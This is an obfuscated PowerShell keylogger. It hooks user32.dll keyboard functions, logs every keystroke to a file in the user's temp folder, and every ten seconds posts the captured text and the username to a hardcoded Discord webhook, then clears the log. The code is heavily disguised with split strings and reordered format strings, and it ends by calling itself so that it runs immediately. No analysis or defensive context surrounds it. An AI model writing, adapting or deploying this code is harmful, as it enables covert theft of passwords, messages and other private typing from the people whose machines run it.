



Set-Variable -Name webhook -Value ( 'https:/'  +  '/di' +  'scord.com/' +'api'+'/w'  +'eb' +  'ho' +  'oks'  + '/' + '138'+'0' + '97'  + '6'+ '42'  +'5208778935/BYngRi6W'+  '-bJS40mQ' +'iRL'+ 'o6'  +'enK1'+  'A4Ya'+'jR'  +'8qR'  +  '0'+'jExZ' +  'T'+ 'A4zuPr6'+ 'i' +'7c' +  '4G' + '4'  +  'S' +  'YUCSp'  +'Pxzhll'+ 'B'+ 'ke')


$PID  |     . (  "{2}{1}{0}"-f'e','ut-Fil','O') "$env:TEMP\DdBPKCytRe"


function kE`ylOgGer(  $logFile= "$env:TEMP\$env:UserName.log" ) {
    
    if (-not (  .( "{3}{2}{0}{1}"-f'st-','Path','e','T'  ) $logFile)  ) {
          &("{2}{1}{0}"-f'm','w-Ite','Ne' ) -Path $logFile -ItemType (  'Fil'+'e') -Force   |   .  (  "{0}{2}{1}" -f'O','t-Null','u'  )
    }

    
    Set-Variable -Name APIsignatures -Value (  ('HfU
[DllImpo'+'rt(X6wuser3'  +'2.d' +  'llX6w, Ch' + 'arSet'  +'=CharS'  +'et.Auto, E'+'xa' +'c' + 'tSpelli'+  'ng=true)]
pub'  + 'lic st' +  'a'  +  'tic e'+ 'xtern'+  ' sh'  +'or' + 't Ge'  +'tAsyncK'  +  'eyStat'+  'e(i'+ 'n' +'t vi' +  'rt'  +  'ualKeyCode)'  +  ';
[DllImpor'+ 't(X'+'6w'  + 'user32'  + '.'+  'dllX6w,' +  ' CharSet'+  '='  +'CharSet.A' +'uto)]
'+  'p' +'ublic'  +  ' st'+  'atic' + ' ext' +'ern ' + 'int'+' GetKe'+  'yboa'+'rdState(b' +  'yte[] keys' + 'tate);' + '
[DllImp'  +  'o' +  'rt'  +'(X6wu' +'ser32.d'+ 'llX6w, CharS'+'et=CharSet.Auto)' +  ']'  +  '
publ'  +'ic stat'  +  'ic ex' + 'tern int MapV' +  'irtua'  + 'lKey(u' +  'int uCod' + 'e, '  +'i'  + 'nt uM' +  'apT' +  'ype);
'+  '[D'  +'llImpor'  +  't('  + 'X6wuser32.dllX6w' +  ', ' +'Cha'+  'rSet='  + 'Ch'+ 'a' +'rSet.Au'+ 't' +  'o)]
public s'+'tatic ex'+'t'  +  'ern i'  +'nt ToUnic' + 'ode'+ '(uint'  +  ' wVirtK'  + 'ey, u' + 'int w' +'ScanCo'+'de, byte[]'+  ' l'  +  'pkeyst'+'ate, System.'+'Text.'+'Stri' +'ng' + 'B' +'uilder pws'  +'zBu' + 'f'  +  'f, i' +  'nt cc'+  'hBuff, uin' +'t' +  ' wFlags);
HfU')."R`EP`LACe"( 'X6w',[sTRIng][CHaR]34 )."r`EplAce"( 'HfU',[sTRIng][CHaR]39)  )

    
    Set-Variable -Name API -Value (&("{0}{1}{2}" -f 'Ad','d-Typ','e') -Namespace ('A' +  'PI' ) -PassThru -MemberDefinition $APIsignatures -Name (  'Wi'+ 'n32' ))

    
    Set-Variable -Name lastWebhookTime -Value (&  ("{2}{1}{0}"-f'ate','t-D','Ge' ))

    
    try {
        while ($true) {
            

            
            if (  (( & ( "{0}{1}{2}" -f 'Get-D','at','e')  ) - $lastWebhookTime  )."tot`ALSEco`N`DS" -ge 10) {
                try {
                    
                    $logs  =    .  (  "{1}{2}{0}"-f'Content','Get','-') -Path $logFile -Raw -Encoding (  'Unico' +  'd'  +  'e'  )
                    if ($logs) {
                        
                        $logs  =  $logs."sU`BSt`RInG"( 0, [Math]::('M' + 'in').Invoke(  $logs."Le`NgTH", 2000 )  )
                        
                        $logs   = $logs -replace (( '[' +  '^{0}x20-{0}x7'+  'E'+']') -f[Char]92  ), ''
                        
                        $Body  = @{
                            (  'use'  + 'rn'+'ame' )   = $env:UserName
                            ( 'c' + 'ontent')  =   $logs
                        }
                        $jsonBody = $Body  |    .  (  "{3}{1}{2}{4}{0}" -f 'on','rtT','o-J','Conve','s'  )
                         &  ( "{3}{2}{0}{1}"-f't','ent','n','Add-Co') -Path "$env:TEMP\keylogger_debug.log" -Value (  'S' +'e' +'nding '  + 'payloa'+'d'+ ': '+"$jsonBody"  )
                        
                          &  (  "{3}{0}{4}{1}{2}"-f 'nv','h','od','I','oke-RestMet'  ) -Uri $webhook -Method ( 'P'  +  'ost') -Body $jsonBody -ContentType ( 'a'+'ppli' +  'ca' + 'tion/' +  'j'  +  'son' )  | &(  "{2}{1}{0}"-f'Null','t-','Ou' )
                        
                         &  ( "{0}{4}{2}{1}{3}"-f'C','Conte','ar-','nt','le') -Path $logFile -Force
                    }
                }
                catch {
                    
                    $errorMessage  = $_."E`xcEPtIOn"."ME`ssaGE"
                    if (  $_."eXCE`P`Tion"."respoN`sE" ) {
                        $responseStream   =   $_."eXCEp`Ti`On"."re`spo`NSe".(  'Ge'+ 'tResponse'+ 'S'  +'tr'  + 'eam'  ).Invoke(    )
                        $reader  =   & (  "{1}{2}{0}"-f't','New-Obje','c' ) (  'Syst'  + 'em.IO.S'+ 't'  +  'reamReade' +'r' )( $responseStream )
                        $responseBody =  $reader.( 'ReadTo'  +'En' +'d').Invoke(    )
                        $errorMessage += ( ' '  +  '- ' +  'Di'+'scord'  + ' '+'Re'  +'sponse:' +' '  +  "$responseBody"  )
                    }
                     .("{2}{3}{0}{1}" -f't','ent','Add-','Con'  ) -Path "$env:TEMP\keylogger_error.log" -Value $errorMessage
                }
                $lastWebhookTime  =   & ( "{0}{1}" -f'Get-Da','te'  )
            }

            
            for ( Set-Variable -Name ascii -Value (8);   $ascii -le 254; $ascii++  ) {  
                Set-Variable -Name keystate -Value ($API::(  'GetAs'+ 'y' +'nc'+'KeySt' +'ate'  ).Invoke($ascii))
                if ($keystate -eq -32767) {
                    $null =   [console]::"c`Ap`sLock"
                    $mapKey  = $API::(  'Map'  + 'Vir'+  't'+'ualKey' ).Invoke(  $ascii, 3  )
                    $keyboardState =  &  (  "{0}{2}{3}{1}" -f'N','t','ew-','Objec') ('By'  +'te[' +']') 256
                    $hideKeyboardState   =  $API::('GetKey' +  'boardSta' + 't'+ 'e').Invoke(  $keyboardState  )
                    $loggedchar =   &  ("{2}{3}{0}{1}"-f 'bj','ect','N','ew-O') -TypeName ( 'Sy'+'ste'+  'm.'+'Text.Str'+ 'in' + 'gB'  + 'uilder' )

                    if ($ascii -eq 8 ) {  
                        [System.IO.File]::"A`pPeN`dAL`lTE`xt"(  $logFile, ('['+ 'BACKSP'+'A'  +'CE]'), [System.Text.Encoding]::"UNi`cO`De" )
                    } elseif ( $ascii -eq 46) {  
                        [System.IO.File]::"ap`penD`AL`ltexT"( $logFile, ('[DEL'+'E' +  'TE]'), [System.Text.Encoding]::"U`NICoDE")
                    } elseif ( $API::('ToUni'+'c' + 'od' +  'e' ).Invoke(  $ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar."ca`PaCITY", 0 ) ) {
                        [System.IO.File]::"ApP`E`NDAl`ltE`XT"($logFile, $loggedchar, [System.Text.Encoding]::"u`N`icODE"  )
                    }
                }
            }
        }
    }
    finally {
        
        try {
            Set-Variable -Name logs -Value (. ("{0}{1}{2}"-f'Get-Con','ten','t' ) -Raw -Path $logFile -Encoding (  'U' + 'nicode'  ))
            if ($logs ) {
                $logs   =   $logs."sUB`stRiNg"(0, [Math]::('Mi'+'n' ).Invoke(  $logs."L`EnGTh", 2000 )  )
                $logs   = $logs -replace ( ( '[^'  +  'M'+  'D' +'Kx20-' +  'MDKx' + '7E]'  ).(  'r'  +'ePLa' + 'Ce'  ).Invoke('MDK','\')), ''
                $Body  =   @{
                    ( 'u' +'sername'  )   =  $env:UserName
                    ('cont'+  'en' +'t')    =  $logs
                }
                $jsonBody   = $Body   |    .( "{0}{3}{2}{4}{1}"-f 'C','on','nvertTo','o','-Js' )
                &  (  "{2}{0}{1}{3}"-f 'dd-','C','A','ontent') -Path "$env:TEMP\keylogger_debug.log" -Value ( 'Fi'+'nal' +' ' +  'pa' + 'ylo'  +  'ad' +  ': ' + "$jsonBody" )
                &("{5}{2}{3}{4}{1}{0}" -f'thod','estMe','e','-','R','Invok' ) -Uri $webhook -Method ( 'Pos'+'t'  ) -Body $jsonBody -ContentType ('a'  +  'pplication/js'+ 'on' ) |   .(  "{1}{0}"-f 'ull','Out-N')
            }
        }
        catch {
            Set-Variable -Name errorMessage -Value ($_."e`x`Ce`ptIon"."mesS`AgE")
            if (  $_."Ex`CE`PTIon"."REs`PoN`SE" ) {
                $responseStream   =  $_."eX`CEP`TioN"."rE`sPO`Nse".(  'Ge'+  'tR'  +'esponseStr' + 'eam'  ).Invoke(   )
                $reader   =   & ("{1}{3}{0}{2}"-f'O','New','bject','-'  ) ('S' +  'ystem.IO.Str'+  'ea'+  'mR' +'eader'  )( $responseStream)
                $responseBody   =  $reader.( 'Re' + 'adToEn'+'d' ).Invoke(    )
                $errorMessage += (' ' + '- ' +'Di'+  's'  + 'cord ' + 'Respons'  +'e'+': '  +  "$responseBody")
            }
            &( "{1}{0}{3}{2}" -f'Co','Add-','nt','nte') -Value $errorMessage -Path "$env:TEMP\keylogger_error.log"
        }
    }
}


.("{0}{2}{1}" -f'Key','er','Logg' )
